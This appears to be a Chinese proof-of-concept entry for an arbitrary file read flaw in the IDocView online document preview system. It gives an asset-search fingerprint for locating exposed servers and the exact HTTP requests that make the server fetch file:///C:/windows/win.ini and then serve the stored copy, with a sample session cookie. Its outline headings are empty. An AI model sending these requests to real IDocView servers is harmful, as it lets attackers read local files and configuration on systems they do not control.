# IDocView在线文档预览系统doc存在任意文件读取

- **系统**：IDocView　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`app.name="I Doc View"`
- **请求**：`GET /doc/upload?token=testtoken&url=file:///C:/windows/win.ini&name=test.txt HTTP/1.1`
- **关键头**：`Host: {hostname}`　`Cookie: JSESSIONID=4531E543B156F255B51E6F5C63216214`

**请求体 / payload**
```
GET /data/test/2023/1031/15/151534_167_OCHiYvt.txt HTTP/1.1
Host: {hostname}
Cookie: JSESSIONID=4531E543B156F255B51E6F5C63216214
```

**其他**
- I Doc View在线文档预览系统doc存在任意文件读取: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * I Doc View